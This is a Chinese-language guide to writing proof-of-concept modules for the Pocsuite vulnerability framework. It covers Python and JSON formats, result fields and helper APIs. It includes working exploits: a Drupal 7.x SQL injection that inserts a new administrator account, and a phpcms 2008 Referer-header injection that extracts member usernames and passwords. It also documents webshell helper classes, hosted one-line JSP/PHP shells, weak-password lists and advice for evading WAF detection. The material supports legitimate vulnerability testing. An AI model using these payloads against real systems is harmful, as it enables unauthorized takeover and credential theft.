PoC 编写规范及要求说明
---
* [概述](#overview)
* [PoC 编写规范](#write_poc)
  * [PoC python脚本编写步骤](#pocpy)
  * [PoC JSON 脚本编写步骤](#pocjson)
  * [PoC 编写注意事项](#attention)
  * [Pocsuite 远程调用文件列表](#inclue_files)
  * [通用API列表](#common_api)
    * [通用方法](#api_common)
    * [Shell 类](#api_shell)
    * [packet](#api_packet)
    * [参数调用](#api_params)
  * [PoC 代码示例](#PoCexample)
    * [PoC Python 代码示例](#pyexample)
    * [PoC JSON 代码示例](#jsonexample)
* [PoC 规范说明](#PoCstandard)
  * [PoC 编号说明](#idstandard)
  * [PoC 命名规范](#namedstandard)
  * [PoC 第三方模块依赖说明](#requires)
  * [PoC 结果返回规范](#resultstandard)
    * [extra 字段说明](#result_extara)
    * [通用字段说明](#result_common)
  * [漏洞类型规范](#vulcategory)


### 概述<div id="overview"></div>
 本文档为 Pocsuite PoC 编写规范及要求说明，Pocsuite 支持 python 和 JSON 两种格式的 PoC，本文档包含了两种格式的 PoC 编写的步骤以及相关 API 的一些说明。一个优秀的 PoC 离不开反复的调试、测试，在阅读本文档前，请先阅读 [《Pocsuite 使用文档》](./USAGE.md)。

### PoC 编写规范<div id="write_poc"></div>
#### PoC python脚本编写步骤<div id="pocpy"></div>

本小节介绍 PoC python脚本编写

Pocsuite 支持 Python 2.7，如若编写 Python 格式的 PoC，需要开发者具备一定的 Python 基础

1. 首先新建一个.py文件,文件名应当符合 [《PoC 命名规范》](#namedstandard)


2. 编写PoC实现类TestPoC,继承自PoCBase类.

  ```python
  #!/usr/bin/env python
  # -*- coding: utf-8 -*-
  from pocsuite.api.request import req #用法和 requests 完全相同
  from pocsuite.api.poc import register
  from pocsuite.api.poc import Output, POCBase

  class TestPOC(POCBase):
    ...

  ```
3. 填写 PoC 信息字段,**要求认真填写所有基本信息字段**
```python
    vulID = '1571'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1' #默认为1
    author = 'zhengdt' #  PoC作者的大名
    vulDate = '2014-10-16' #漏洞公开的时间,不知道就写今天
    createDate = '2014-10-16'# 编写 PoC 的日期
    updateDate = '2014-10-16'# PoC 更新的时间,默认和编写时间一样
    references = ['https://www.sektioneins.de/en/blog/14-10-15-drupal-sql-injection-vulnerability.html']# 漏洞地址来源,0day不用写
    name = 'Drupal 7.x /includes/database/database.inc SQL注入漏洞 PoC'# PoC 名称
    appPowerLink = 'https://www.drupal.org/'# 漏洞厂商主页地址
    appName = 'Drupal'# 漏洞应用名称
    appVersion = '7.x'# 漏洞影响版本
    vulType = 'SQL Injection'#漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        Drupal 在处理 IN 语句时，展开数组时 key 带入 SQL 语句导致 SQL 注入，
        可以添加管理员、造成信息泄露。
    ''' # 漏洞简要描述
    samples = []# 测试样列,就是用 PoC 测试成功的网站
    install_requires = [] # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    ```

4. 编写验证模式

  ```python
  def _verify(self):
      output = Output(self)
      result = {} #result是返回结果
      # 验证代码
  ```
5. 编写攻击模式

    攻击模式可以对目标进行 getshell,查询管理员帐号密码等操作.定义它的方法与检测模式类似
    ```python
    def _attack(self):
        output = Output(self)
        result = {}
        # 攻击代码
    ```

    和验证模式一样,攻击成功后需要把攻击得到结果赋值给 result 变量

    **注意:如果该 PoC 没有攻击模式,可以在 \_attack()函数下加入一句 return self.\_verify() 这样你就无需再写 \_attack 函数了。**

6. 结果返回

    不管是验证模式或者攻击模式，返回结果 result 中的 key 值必须按照下面的规范来写，result 各字段意义请参见[《PoC 结果返回规范》](#resultstandard)

    ```
    'Result':{
       'DBInfo' :   {'Username': 'xxx', 'Password': 'xxx', 'Salt': 'xxx' , 'Uid':'xxx' , 'Groupid':'xxx'},
       'ShellInfo': {'URL': 'xxx', 'Content': 'xxx' },
       'FileInfo':  {'Filename':'xxx','Content':'xxx'},
       'XSSInfo':   {'URL':'xxx','Payload':'xxx'},
       'AdminInfo': {'Uid':'xxx' , 'Username':'xxx' , 'Password':'xxx' }
       'Database':  {'Hostname':'xxx', 'Username':'xxx',  'Password':'xxx', 'DBname':'xxx'},
       'VerifyInfo':{'URL': 'xxx' , 'Postdata':'xxx' , 'Path':'xxx'}
       'SiteAttr':  {'Process':'xxx'}
    }
    ```

    output 为 Pocsuite 标准输出API，如果要输出调用成功信息则使用 `output.success(result)`,如果要输出调用失败则 `output.fail()`,系统自动捕获异常，不需要PoC里处理捕获,如果PoC里使用try...except 来捕获异常，可通过`output.error('Error Message')`来传递异常内容,建议直接使用模板中的parse_output通用结果处理函数对_verify和_attack结果进行处理。
    ```
    def _verify(self, verify=True):
        result = {}
        ...

        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail()
        return output
    ```

7. 注册PoC实现类

    在类的外部调用register()方法注册PoC类
    ```
    Class TestPOC(POCBase):
        #POC内部代码

    #注册TestPOC类
    register(TestPOC)
    ```

#### PoC JSON 脚本编写步骤<div id="pocjson"></div>

JSON 格式的 PoC 类似于完形填空,只需要填写相应的字段的值即可。**目前 JSON支持的漏洞类型比较局限，如果想实现理复杂的业务逻辑，建议使用 Python**


1. 首先新建一个.json文件,文件名应当符合 **PoC 命名规范**

2. PoC JSON 有两个 key，pocInfo 和 pocExecute，分别代表 PoC 信息部分执行体。

    ```
    {
        "pocInfo":{},
        "pocExecute":{}
    }
    ```

3. 填写 pocInfo 部分：

    ```
    {
        "pocInfo":{
            "vulID": "poc-2015-0107",
            "name": "Openssl 1.0.1 内存读取 信息泄露漏洞",
            "protocol": "http",
            "author": "test",
            "references": ["http://drops.wooyun.org/papers/1381"],
            "appName": "OpenSSL",
            "appVersion" : "1.0.1~1.0.1f, 1.0.2-beta, 1.0.2-beta1",
            "vulType": "Information Disclosure",
            "desc" :"OpenSSL是一个强大的安全套接字层密码库。这次漏洞被称为OpenSSL“心脏出血”漏洞，这是关于 OpenSSL 的信息泄漏漏洞导致的安全问题。它使攻击者能够从内存中读取最多64 KB的数据。安全人员表示：无需任何特权信息或身份验证，我们就可以从我们自己的（测试机上）偷来X.509证书的私钥、用户名与密码、聊天工具的消息、电子邮件以及重要的商业文档和通信等数据.",
            "samples": ["http://www.baidu.com", "http://www.qq.com"]
        },
        "pocExecute":{}
    }   
    ```
    各字段的含义与 python 属性部分相同。

4. 填写 pocExecute 部分：
    pocExecute 分为 verify 和 attack 两部分
    ```
    {
        "pocInfo":{},
        "pocExecute":{
            "verify":[],
            "attack":[]
        }
    }
    ```
    **填写 verify 部分:**
    ```
    {
        "pocInfo":{},
        "pocExecute":{
            "verify":[
                {
                    "step": "1",
                    "method": "get",
                    "vulPath": "/api.php",
                    "params": "test=123&seebug=1234",
                    "necessary": "",
                    "headers": {"cookie": "123"},
                    "status":"200",
                    "match": {
                        "regex": ["baidu","google"],
                        "time": "time"
                    }
                },
                {
                    "step": "2",
                    "method": "get",
                    "vulPath": "/api.php",
                    "params": "test=seebug",
                    "necessary": "",
                    "headers": "",
                    "status": "200",
                    "match":{
                        "regex": [""],
                        "time": "0.01"
                    }
                }
            ],
            "attack":[]
        }
    }
    ```
    >说明：

    >step: 按照上下顺序执行，值可以取0和非0两种。如果step的值为0,那么验证成功后就会返回成功，如果step的值不为0,那么需要全部满足后才返回成功。

    > method：请求方式

    > vulPath：请求路径

    > params：请求参数

    > necessary：请求中必须存在的数据，例如cookie

    > headers：自定义请求头部

    > status: 返回的 HTTP 状态码

    > match：返回体，其中：

    > > regex：表示字符串匹配，为数组类型，当且仅当regex中所有的元素都匹配成功的情况下，返回True，否则返回False."

    > > time：为时间差

    > > 当regex和time同时存在时，取regex，time失效。

    **verify 中每个元素代表一个请求。**

    **填写 attack 部分:**
    ```
    {
        "pocInfo":{},
        "pocExecute":{
            "verify":[],
            "attack":[
                {
                    "step": "1",
                    "method": "get",
                    "vulPath": "/api.php",
                    "params": "test=123&seebug=1234",
                    "necessary": "",
                    "headers": {"cookie": "123"},
                    "status":"200",
                    "match": {
                        "regex": ["baidu","google"],
                        "time": "time"
                    },
                    "result":{
                    "AdminInfo":{
                        "Password":"<regex>www(.+)com"
                    }
                    }
                }        
            ]
        }
    }
    ```
    attack 部分和 verify 部分类似，比 verify 部分多一个 "result".

    > "result": 为输出，其类型为 dict

    > "AdminInfo": 是管理员信息，此项见 [Result 说明](#resultstandard)

    > "Password": 是result中 AdminInfo 中的字段，其值支持正则表达式，如果需要使用正则表达式来获取页面信息，则需要在表达式字符串前加`<regex>`



#### PoC 编写注意事项<div id="attention"></div>
1. 要求在编写PoC的时候，尽量的不要使用第三方模块，如果在无法避免的情况下，请认真填写install_requires 字段，填写格式参考《PoC第三方模块依赖说明》。
2.	要求编写PoC的时候，尽量的使用Pocsuite 已经封装的API提供的方法，避免自己重复造轮子，对于一些通用方法可以加入到API，具体参考《通用API列表》。
3.	如果PoC需要包含远程文件等，统一使用Pocsuite 远程调用文件，具体可以参考[《Pocsuite 远程调用文件列表》](#inclue_files)，不要引入第三方文件，如果缺少对应文件，联系管理员添加。
4.	要求每个PoC在编写的时候，尽可能的不要要求输入参数，这样定制化过高，不利于PoC的批量化调度执行，尽可能的PoC内部实现参数的构造，至少应该设置默认值，如某个PoC需要指定用户id，那么应该允许使用extar_param传入id，也应该没有传入该参数的时候自动设置默认值，不应该影响PoC的正常运行与验证。
5.	要求每个PoC在输出结果的时候，尽可能的在不破坏的同时输出取证信息，如输出进程列表，具体参考[《PoC 结果返回规范》](#resultstandard)。
6.	要求认真填写PoC信息字段，其中vulID请填写Seebug上的漏洞ID（不包含SSV-）。
7.	为了防止误报产生以及避免被关键词被WAF等作为检测特征,要求验证结果判断的时候输出随机的字符串（可以调用API中的randomStr方法），而不用采用固定字符串。
  比如：
  ```
        检测 SQL 注入时,
            token = randomStr()
            payload = 'select md5(%s)' % token
            ...

            if hashlib.new('md5', token).hexdigest() in content:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url+payload
        检测 XSS 漏洞时,
            token = randomStr()
            payload = 'alert("%s")' % token
            ...

            if hashlib.new('md5', token).hexdigest() in content:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url+payload
        检测 PHP 文件上传是否成功,

            token = randomStr()
            payload = '<?php echo md5("%s");unlink(__FILE__);?>' % token
            ...

            if hashlib.new('md5', token).hexdigest() in content:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url+payload
  ```
8.	任意文件如果需要知道网站路径才能读取文件的话,可以读取系统文件进行验证,要写 Windows 版和 Linux 版两个版本。
9.	检测模式下,上传的文件一定要删掉。
10.	程序可以通过某些方法获取表前缀，just do it；若不行，保持默认表前缀。
11.	PoC 编写好后，务必进行测试，测试规则为：5个不受漏洞的网站，确保 PoC 攻击不成功；5个受漏洞影响的网站，确保 PoC 攻击成功

#### Pocsuite 远程调用文件列表<div id="inclue_files"></div>
部分 PoC 需要采用包含远程文件的形式，要求基于 Pocsuite 的 PoC 统一调用统一文件(如需引用未在以下文件列表内文件，请联系s1@seebug.org或者直接提交 issue)。
统一URL调用路径：http://pocsuite.org/include_files/，如http://pocsuite.org/include_files/xxe_verify.xml

**文件列表**

|文件名|说明|
|-----|---|
|a.jsp|一个通用简单的 JSP 一句话 Shell，攻击模式|
|b.jsp|一个通用简单的 JSP 一句话 Shell，验证模式|
|php_attack.txt|PHP 一句话|
|php_verify.txt|PHP 打印 md5 值|
|xxe_verify.xml|XXE 验证文件|


#### 通用API列表<div id="common_api"></div>
在编写 PoC 的时候，相关方法请尽量调用通用的已封装的 API

**通用方法**<div id="api_common"></div>

|方法|说明|
|---|----|
|from api.utils import logger|日志记录，比如logger.log(info)|
|from pocsuite.net import req|请求类，用法同 requests|
|from api.utils import getWeakPassword|返回一个包含弱密码列表, 包含了 100 个弱密码|
|from api.utils import getLargeWeakPassword|返回一个包含弱密码的列表, 包含了 1000 个弱密码|
|from api.utils import randomStr|接受两个可选参数 a(int) 和 b(str), 随机返回由 b 中字符构成的长度为 a 的字符串|
|from api.utils import url2ip|将传入的url（str）转换为ip|
|from api.utils import strToDict|把形如 "{'test': '1'}" 的字符串转化成字典的函数|
|from api.utils import writeText|/ writeBinary 以文本 / 二进制模式写入文件|
|from api.utils import resolve_js_redirects|获取js跳转后的url |

**Shell 类**<div id="api_shell"></div>

Pocsuite 提供两个类来快速生成WebShell。具体代码见：lib/utils/webshell.py

WebShell类：

```
class Webshell:
    #基础Webshell类
    # @pwd :    Webshell密码
    # @content: Webshell代码
    # @check:   检验代码
    # @keyword: 检验特征关键字
    __init__(self, pwd='', content='', check='', keyword='')

    set_pwd(self, pwd)#设置webshell密码
    get_pwd(self)     #获取webshell密码
    get_content(self) #获取webshell代码
    check(self, url)  #校验执行结果

```

VerifyShell类：

```
class VerifyShell(Webshell):

    def __init__(self, content='', keyword=''):
        Webshell.__init__(self, content=content, keyword=keyword)
        self._check_data = {}
```

Pocsuite中封装了常用的一句话WebShell，默认密码均为cmd。如果需要在页面中直接调用webshell，需要引入webshell类。
如：使用PhpShell类
```
from lib.utils.webshell import PhpShell
```
如果需要自定义WebShell，可以继承WebShell类。
如果需要自定义VerifyShell,可以继承VerifyShell类。


**packet**<div id="api_packet"></div>

提供IP, TCP, UDP, send, recv几个方法，方便对socket进行操作，可以自定义IP、TCP、UDP三种类型数据包，以及进行发送和接收操作等。

**参数调用**<div id="api_params"></div>

* self.headers 用来获取 http 请求头, 可以通过 --cookie, --referer, --user-agent, --headers 来修改和增加需要的部分
* self.params 用来获取 --extra-params 赋值的变量, Pocsuite 会自动转化成字典格式, 未赋值时为空字典
* self.url 用来获取 -u / --url 赋值的 URL, 如果之前赋值是 baidu.com 这样没有协议的格式时, Pocsuite 会自动转换成 http:// baidu.com



#### PoC 代码示例<div id="PoCexample"></div>

##### PoC Python 代码示例<div id="pyexample"></div>

[Drupal 7.x /includes/database/database.inc SQL注入漏洞](http://www.seebug.org/vuldb/ssvid-88927) PoC:
```
#!/usr/bin/env python
# coding: utf-8
import urllib
import random
import string
from collections import OrderedDict

from pocsuite.api.request import req #用法和 requests 完全相同
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase


class TestPOC(POCBase):
    vulID = '1571'  # vul ID
    version = '1'
    author = 'zhengdt'
    vulDate = '2014-10-16'
    createDate = '2014-10-16'
    updateDate = '2014-10-16'
    references = ['https://www.sektioneins.de/en/blog/14-10-15-drupal-sql-injection-vulnerability.html']
    name = 'Drupal 7.x /includes/database/database.inc SQL注入漏洞 POC'
    appPowerLink = 'https://www.drupal.org/'
    appName = 'Drupal'
    appVersion = '7.x'
    vulType = 'SQL Injection'
    desc = '''
        Drupal 在处理 IN 语句时，展开数组时 key 带入 SQL 语句导致 SQL 注入，
        可以添加管理员、造成信息泄露。
    '''

    samples = []

    def _attack(self):
        result = {}
        vul_url = '%s/?q=node&destination=node' % self.url
        uid = int(random.random() * 1000)
        username = ''.join(random.sample(string.letters+string.digits, 5))
        payload = OrderedDict()

        if not self._verify(verify=False):
            return self.parse_attack(result)

        payload['name[0;insert into users(uid, name, pass, status, data) values (%d, \'%s\', ' \
                '\'$S$DkIkdKLIvRK0iVHm99X7B/M8QC17E1Tp/kMOd1Ie8V/PgWjtAZld\', 1, \'{b:0;}\');' \
                'insert into users_roles(uid, rid) values (%d, 3);#]' % (uid, username, uid)] \
                 = 'test'
        payload['name[0]'] = 'test2'
        payload['pass'] = 'test'
        payload['form_id'] = 'user_login_block'

        #print urllib.urlencode(payload)
        response = req.post(vul_url, data=payload)
        if response.status_code == 200:
            result['AdminInfo'] = {}
            result['AdminInfo']['Username'] = username
            result['AdminInfo']['Password'] = 'thanks'

        return self.parse_attack(result)

    def _verify(self, verify=True):
        result = {}
        vul_url = '%s/?q=node&destination=node' % self.url
        payload = {
            'name[0 and (select 1 from (select count(*),concat((select md5(715890248' \
                '135)),floor(rand(0)*2))x from  information_schema.tables group by x' \
                ')a);;#]': 'test',
            'name[0]': 'test2',
            'pass': 'test',
            'form_id': 'user_login_block',
        }

        response = req.post(vul_url, data=payload).content
        if 'e4f5fd37a92eb41ba575c81bf0d31591' in response:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo']['Payload'] = urllib.urlencode(payload)

        return self.parse_attack(result)

    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail()
        return output

register(TestPOC)

```

##### PoC JSON 代码示例<div id="jsonexample"></div>
[phpcms_2008_/ads/include/ads_place.class.php_sql注入漏洞](http://www.seebug.org/vuldb/ssvid-62274) PoC:

由于 JSON 不支持注释,所以具体字段意义请参考上文，涉及到的靶场请自行根据 Seebug 漏洞详情搭建。

```
{
    "pocInfo": {
        "vulID": "62274",
        "version":"1",
        "vulDate":"2011-11-21",
        "createDate":"2015-09-15",
        "updateDate":"2015-09-15",
        "name": "phpcms_2008_ads_place.class.php_sql-inj",
        "protocol": "http",
        "vulType": "SQL Injection",
        "author": "Medici.Yan",
        "references": ["http://www.seebug.org/vuldb/ssvid-62274"],
        "appName": "phpcms",
        "appVersion" : "2008",
        "appPowerLink":"http://www.phpcms.cn",
        "desc" :"phpcms 2008 中广告模块，存在参数过滤不严，导致了sql注入漏洞，如果对方服务器开启了错误显示，可直接利用，如果关闭了错误显示，可以采用基于时间和错误的盲注",
        "samples": ["http://127.0.0.1"]
    },

    "pocExecute":{
        "verify": [
            {
                "step": "0",
                "method": "get",
                "vulPath": "/data/js.php",
                "params": "id=1",
                "necessary": "",
                "headers": {"Referer":"1', (SELECT 1 FROM (select count(*),concat(floor(rand(0)*2),char(45,45,45),(SELECT md5(1)))a from information_schema.tables group by a)b), '0')#"},
                "status": "200",
                "match": {
                    "regex": ["c4ca4238a0b923820dcc509a6f75849b"],
                    "time":""
                }
            }
        ],
        "attack": [
            {
                "step": "0",
                "method": "get",
                "vulPath": "/data/js.php",
                "params": "id=1",
                "necessary": "",
                "headers": {"Referer":"1', (SELECT 1 FROM (select count(*),concat(floor(rand(0)*2),char(45,45),(SELECT concat(username,char(45,45,45),password,char(45,45)) from phpcms_member limit 1))a from information_schema.tables group by a)b), '0')#"},
                "status":"200",                
                "match":{
                    "regex": ["Duplicate"],
                    "time": ""
                },
                "result":{
                    "AdminInfo":{
                        "Username":"<regex>--(.+)---",
                        "Password": "<regex>---(.+)--"
                    }
                }
            }
        ]
    }
}

```

使用 JSON PoC 检测目标：

![verify](http://pocsuite.org/images/PoC_JSON_verify.png)

使用 JSON PoC 攻击目标：
![attack](http://pocsuite.org/images/PoC_JSON_attack.png)


### PoC 规范说明<div id="PoCstandard"></div>

#### PoC 编号说明<div id="idstandard"></div>
PoC 编号ID 与漏洞 ID 一致.

示例, 漏洞库中的漏洞统一采用“SSV-xxx”编号的方式, 则 PoC 编号为 xxx


#### PoC 命名规范<div id="namedstandard"></div>

PoC 命名分成3个部分组成漏洞应用名_版本号_漏洞类型名称 然后把文件名种的所有字母改成成小写,所有的符号改成_.
文件名不能有特殊字符和大写字母 最后出来的文件名应该像这样

```
    _1847_seeyon_3_1_login_info_disclosure.py
```
#### PoC 第三方模块依赖说明<div id="requires"></div>
PoC 编写的时候要求尽量不要使用第三方模块，如果必要使用，请在 PoC 的基础信息部分，增加 install_requires 字段，按照以下格式填写依赖的模块名。
```
install_requires =[str_item_,str_item,…] # 整个字段的值为list，每个项为一个依赖模块
```

str_item 格式：模块名==版本号，模块名为pip install 安装时的模块名（请不要填写 import 的模块名）


#### PoC 结果返回规范<div id="resultstandard"></div>

result 为PoC返回的结果数据类型, result返回值要求返回完整的一项, 暂不符合result字段的情况, 放入extra字段中, 此步骤必须尽可能的保证运行者能够根据信息 复现/理解 漏洞, 若果步骤复杂, 在取证信息中说明. 例如:

```python
  #返回数据库管理员密码
  result['DBInfo']['Password']='xxxxx'
  #返回 Webshell 地址
  result['ShellInfo']['URL'] = 'xxxxx'
  #返回网站管理员用户名
  result['AdminInfo']['Username']='xxxxx'
```

**extra 字段说明**<div id="result_extara"></div>
extra字段为通用结果字段的补充字段，如果需要返回的内容中不属于通用结果字段，那么可以使用extra字段进行赋值。extra字段为dict格式，可自定义key进行赋值，如
```
result['extra' ]['field'] = 'aa'
```

**特殊字段：** evidence，针对结果中返回取证信息，定义字段名只允许为evidence，并且只能存储于extar字段，即
```
result['extra' ]['evidence'] = 'aa'
```

**通用字段说明**<div id="result_common"></div>
```
result：[
    {  name: 'DBInfo'，        value：'数据库内容' }，
        {  name: 'Username'，      value: '管理员用户名'},
        {  name: 'Password'，      value：'管理员密码' }，
        {  name: 'Salt'，          value: '加密盐值'},
        {  name: 'Uid'，           value: '用户ID'},
        {  name: 'Groupid'，       value: '用户组ID'},

    {  name: 'ShellInfo'，     value: 'Webshell信息'},
        {  name: 'URL'，           value: 'Webshell地址'},
        {  name: 'Content'，       value: 'Webshell内容'},

    {  name: 'FileInfo'，      value: '文件信息'},
        {  name: 'Filename'，      value: '文件名称'},
        {  name: 'Content'，       value: '文件内容'},

    {  name: 'XSSInfo'，       value: '跨站脚本信息'},
        {  name: 'URL'，           value: '验证URL'},
        {  name: 'Payload'，       value: '验证Payload'},

    {  name: 'AdminInfo'，     value: '管理员信息'},
        {  name: 'Uid'，           value: '管理员ID'},
        {  name: 'Username'，      value: '管理员用户名'},
        {  name: 'Password'，      value: '管理员密码'},

    {  name: 'Database'，      value：'数据库信息' }，
        {  name: 'Hostname'，      value: '数据库主机名'},
        {  name: 'Username'，      value：'数据库用户名' }，
        {  name: 'Password'，      value: '数据库密码'},
        {  name: 'DBname'，        value: '数据库名'},

    {  name: 'VerifyInfo'，    value: '验证信息'},
        {  name: 'URL'，           value: '验证URL'},
        {  name: 'Postdata'，      value: '验证POST数据'},
        {  name: 'Path'，          value: '网站绝对路径'},

    {  name: 'SiteAttr'，      value: '网站服务器信息'},
    {  name: 'Process'，       value: '服务器进程'}

    ]

```


#### 漏洞类型规范<div id="vulcategory"></div>

<table border=1>
    <tr><td>英文名称</td><td>中文名称</td><td>缩写</td></tr>
    <tr><td>Cross Site Scripting </td><td> 跨站脚本 </td><td> xss</td></tr>
    <tr><td>Cross Site Request Forgery </td><td> 跨站请求伪造 </td><td> csrf</td></tr>
    <tr><td>SQL Injection </td><td> Sql注入 </td><td> sql-inj</td></tr>
    <tr><td>LDAP Injection </td><td> ldap注入 </td><td> ldap-inj</td></tr>
    <tr><td>Mail Command Injection </td><td> 邮件命令注入 </td><td> smtp-inj</td></tr>
    <tr><td>Null Byte Injection </td><td> 空字节注入 </td><td> null-byte-inj</td></tr>
    <tr><td>CRLF Injection </td><td> CRLF注入 </td><td> crlf-inj</td></tr>
    <tr><td>SSI Injection </td><td> Ssi注入 </td><td> ssi-inj</td></tr>
    <tr><td>XPath Injection </td><td> Xpath注入 </td><td> xpath-inj</td></tr>
    <tr><td>XML Injection </td><td> Xml注入 </td><td> xml-inj</td></tr>
    <tr><td>XQuery Injection </td><td> Xquery 注入 </td><td> xquery-inj</td></tr>
    <tr><td>Command Execution </td><td> 命令执行 </td><td> cmd-exec</td></tr>
    <tr><td>Code Execution </td><td> 代码执行 </td><td> code-exec</td></tr>
    <tr><td>Remote File Inclusion </td><td> 远程文件包含 </td><td> rfi</td></tr>
    <tr><td>Local File Inclusion </td><td> 本地文件包含 </td><td> lfi</td></tr>
    <tr><td>Abuse of Functionality </td><td> 功能函数滥用 </td><td> func-abuse</td></tr>
    <tr><td>Brute Force </td><td> 暴力破解 </td><td> brute-force</td></tr>
    <tr><td>Buffer Overflow </td><td> 缓冲区溢出 </td><td> buffer-overflow</td></tr>
    <tr><td>Content Spoofing </td><td> 内容欺骗 </td><td> spoofing</td></tr>
    <tr><td>Credential Prediction </td><td> 证书预测 </td><td> credential-prediction</td></tr>
    <tr><td>Session Prediction </td><td> 会话预测 </td><td> session-prediction</td></tr>
    <tr><td>Denial of Service </td><td> 拒绝服务 </td><td> dos</td></tr>
    <tr><td>Fingerprinting </td><td> 指纹识别 </td><td> finger</td></tr>
    <tr><td>Format String </td><td> 格式化字符串 </td><td> format-string</td></tr>
    <tr><td>HTTP Response Smuggling </td><td> http响应伪造 </td><td> http-response-smuggling</td></tr>
    <tr><td>HTTP Response Splitting </td><td> http响应拆分 </td><td> http-response-splitting</td></tr>
    <tr><td>HTTP Request Splitting </td><td> http请求拆分 </td><td> http-request-splitting</td></tr>
    <tr><td>HTTP Request Smuggling </td><td> http请求伪造 </td><td> http-request-smuggling</td></tr>
    <tr><td>HTTP Parameter Pollution </td><td> http参数污染 </td><td> hpp</td></tr>
    <tr><td>Integer Overflows </td><td> 整数溢出 </td><td> int-overflow</td></tr>
    <tr><td>Predictable Resource Location </td><td> 可预测资源定位 </td><td> res-location</td></tr>
    <tr><td>Session Fixation </td><td> 会话固定 </td><td> session-fixation</td></tr>
    <tr><td>URL Redirector Abuse </td><td> url重定向 </td><td> redirect</td></tr>
    <tr><td>Privilege Escalation </td><td> 权限提升 </td><td> privilege-escalation</td></tr>
    <tr><td>Resolve Error </td><td> 解析错误 </td><td> resolve-error</td></tr>
    <tr><td>Arbitrary File Creation </td><td> 任意文件创建 </td><td> file-creation</td></tr>
    <tr><td>Arbitrary File Download </td><td> 任意文件下载 </td><td> file-download</td></tr>
    <tr><td>Arbitrary File Deletion </td><td> 任意文件删除 </td><td> file-deletion</td></tr>
    <tr><td>Backup File Found </td><td> 备份文件发现 </td><td> bak-file-found</td></tr>
    <tr><td>Database Found </td><td> 数据库发现 </td><td> db-found</td></tr>
    <tr><td>Directory Listing </td><td> 目录遍历 </td><td> dir-listing</td></tr>
    <tr><td>Directory Traversal </td><td> 目录穿越 </td><td> dir-traversal</td></tr>
    <tr><td>File Upload </td><td> 文件上传 </td><td> file-upload</td></tr>
    <tr><td>Login Bypass </td><td> 登录绕过 </td><td> login-bypass</td></tr>
    <tr><td>Weak Password </td><td> 弱密码 </td><td> weak-pass</td></tr>
    <tr><td>Remote Password Change </td><td> 远程密码修改 </td><td> remote-pass-change</td></tr>
    <tr><td>Code Disclosure </td><td> 代码泄漏 </td><td> code-disclosure</td></tr>
    <tr><td>Path Disclosure </td><td> 路径泄漏 </td><td> path-disclosure</td></tr>
    <tr><td>Information Disclosure </td><td> 信息泄漏 </td><td> info-disclosure</td></tr>
    <tr><td>Security Mode Bypass </td><td> 安全模式绕过 </td><td> sec-bypass</td></tr>
    <tr><td>Malware </td><td> 挂马 </td><td> mal</td></tr>
    <tr><td>Black Link </td><td> 暗链 </td><td> black-link</td></tr>
    <tr><td>Backdoor </td><td> 后门 </td><td> backdoor</td></tr>

</table>

也可以参见[漏洞类型规范](http://seebug.org/category)
